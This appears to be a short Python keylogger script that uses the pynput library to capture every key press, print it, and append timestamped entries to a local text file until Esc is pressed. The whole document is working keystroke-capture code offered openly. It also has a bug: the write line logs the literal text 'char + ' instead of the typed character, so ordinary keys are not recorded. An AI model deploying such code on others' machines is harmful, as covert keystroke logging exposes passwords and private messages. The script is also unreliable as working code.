from pynput import keyboard
import datetime

def key_pressed(key):
    print(str(key))
    
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            logKey.write(f'{timestamp} - char + \n')
        except AttributeError:
            #log special keys( e.g., Shift, Ctrl, etc.)
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            logKey.write(f'{timestamp} - [{key}]\n')
        
def on_release(key):
    #stop listener if Esc key is pressed
    if key == keyboard.Key.esc:
        return False
if __name__ == "__main__": 
    # Start the keyboard listener
    with keyboard.Listener(on_press=key_pressed, on_release=on_release) as listener:
        listener.join()
